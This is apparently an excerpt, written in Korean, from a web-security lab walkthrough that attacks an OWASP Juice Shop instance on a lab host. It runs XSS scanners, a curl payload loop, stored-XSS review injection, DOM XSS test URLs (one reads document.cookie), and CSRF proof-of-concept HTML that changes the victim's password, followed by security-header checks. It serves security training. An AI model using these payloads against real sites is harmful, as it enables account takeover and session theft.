...
> python3 ~/XSStrike/xsstrike.py -u "http://juice.6v6.lab/rest/products/search?q=test"
>
> # 2) Crawl 모드 — 사이트 전체 자동 점검
> python3 ~/XSStrike/xsstrike.py -u http://juice.6v6.lab --crawl
>
...
> dalfox url "http://juice.6v6.lab/rest/products/search?q=test" --silence
> ```
>
...
for payload in "${PAYLOADS[@]}"; do
  ...
  result=$(curl -s "http://juice.6v6.lab/rest/products/search?q=$encoded")
...
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "http://juice.6v6.lab/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
# main JS 안의 위험 함수 빈도 (DOM XSS sink 단서)
MAIN_JS=$(curl -s http://juice.6v6.lab | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
echo "Main JS: $MAIN_JS"
for sink in innerHTML outerHTML document.write bypassSecurity trustAsHtml DomSanitizer; do
  cnt=$(curl -s "http://juice.6v6.lab/$MAIN_JS" | grep -c "$sink")
  printf "  %-20s : %d\n" "$sink" "$cnt"
done
```
...
# 상품 리뷰에 XSS
curl -s -X PUT http://juice.6v6.lab/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{                                                # 요청 데이터(body)
...
# 저장된 리뷰 확인
curl -s http://juice.6v6.lab/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
```
...
MAIN_JS=$(curl -s http://juice.6v6.lab | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
echo "Main JS: $MAIN_JS (size: $(curl -sI http://juice.6v6.lab/$MAIN_JS | grep -i content-length | tr -d '\r'))"

# bypassSecurityTrustHtml 호출 위치 grep — 가장 위험한 패턴
curl -s "http://juice.6v6.lab/$MAIN_JS" | grep -oE '.{0,40}bypassSecurityTrustHtml.{0,60}' | head -5

# DOM XSS 테스트 URL 매트릭스 (각 페이로드 별 사용 source)
cat <<'EOF'
[테스트 URL — 브라우저 직접 실행 필요]
1. http://juice.6v6.lab/#/search?q=<iframe src="javascript:alert(`xss`)">
2. http://juice.6v6.lab/#/track-result?id=<svg onload=alert(1)>
3. http://juice.6v6.lab/#/contact?msg=<img src=x onerror=alert(document.cookie)>
...
curl -s http://juice.6v6.lab | grep -ciE 'csrf|_token|xsrf' || echo '(0건)'

# 2) Set-Cookie 헤더 + SameSite 속성 검사
echo '=== Set-Cookie 분석 ==='
curl -sI http://juice.6v6.lab | grep -i 'set-cookie' || echo '(Set-Cookie 헤더 없음)'

# 3) 로그인 후 쿠키 / JWT 인증 방식 확인
echo '=== 로그인 응답 헤더 ==='
curl -s -I -X POST http://juice.6v6.lab/rest/user/login \
  -H 'Content-Type: application/json' \
...
> - **공격 흐름**: (1) 피해자 JuiceShop 로그인 (JWT 받음 + localStorage 저장) → (2) 악성 사이트 방문 → (3) 악성 JS 가 `fetch('http://juice.6v6.lab/rest/user/...', {credentials:'include'})` → (4) CORS `*` 통과 → JuiceShop 요청 처리.
...
<img src="http://juice.6v6.lab/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">

<!-- 또는 폼을 이용한 POST CSRF -->
<form action="http://juice.6v6.lab/api/Feedbacks/" method="POST" id="csrf-form">
...
curl -s "http://juice.6v6.lab/rest/user/change-password?current=Test1234!&new=Hacked9!&repeat=Hacked9!" \
...
> - **공격 시나리오**: (1) 피해자 로그인 + JWT localStorage 저장 → (2) 악성 사이트의 `<img src="http://juice.6v6.lab/rest/user/change-password?...">` → (3) 브라우저 자동 GET 요청 (단, JWT 가 Authorization 헤더라 자동 첨부 X) → (4) **그러나 CORS `*` + `Credentials: true` 환경이면 fetch 로 가능**.
...
```bash
# 보안 헤더 6종 동시 점검
curl -sI http://juice.6v6.lab | grep -iE \
...
echo '---'
echo '[누락 헤더 카운트]'
HEADERS=$(curl -sI http://juice.6v6.lab)
